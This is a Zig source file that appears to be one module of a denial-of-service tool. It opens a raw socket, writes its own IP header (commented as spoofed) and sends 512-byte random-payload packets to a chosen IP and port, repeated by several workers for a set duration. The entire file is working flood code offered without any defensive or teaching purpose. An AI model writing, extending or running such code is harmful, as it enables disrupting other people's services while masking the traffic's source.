const std = @import("std");

const helpers = @import("../helpers.zig");
const Caller = @import("Caller.zig");

const linux = std.os.linux;

const assemble = @import("headers/assemble.zig");

pub fn raw(allocator: std.mem.Allocator, dst_ip: [4]u8, port: u16, duration: u32) void {
    const c = Caller.init(allocator, 5, duration, @constCast(&_raw), .{ .ip = dst_ip, .port = port });
    c.call();
}

fn _raw(dst_ip: [4]u8, port: u16) void {
    const fd = linux.socket(linux.AF.INET, linux.SOCK.RAW, linux.IPPROTO.RAW);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init(dst_ip, port) };

    const enable = std.mem.toBytes(@as(c_int, 1));
    helpers.setsockopt(@intCast(fd), linux.IPPROTO.IP, linux.IP.HDRINCL, &enable, @intCast(enable.len)) catch return;

    // random payload with spoofed IP header
    const ip_h = @import("headers/IpHeader.zig").initRaw(dst_ip, 512).marshal_raw();

    var buf: [512]u8 = undefined;
    std.posix.getrandom(&buf) catch return;

    // copy IP header to front
    var packet: [20 + 512]u8 = undefined;
    @memcpy(packet[0..20], &ip_h);
    @memcpy(packet[20..], &buf);

    _ = helpers.sendto(@intCast(fd), &packet, packet.len, linux.MSG.NOSIGNAL, &sockaddr.any, @intCast(@as(linux.socklen_t, sockaddr.getOsSockLen()))) catch return;
}
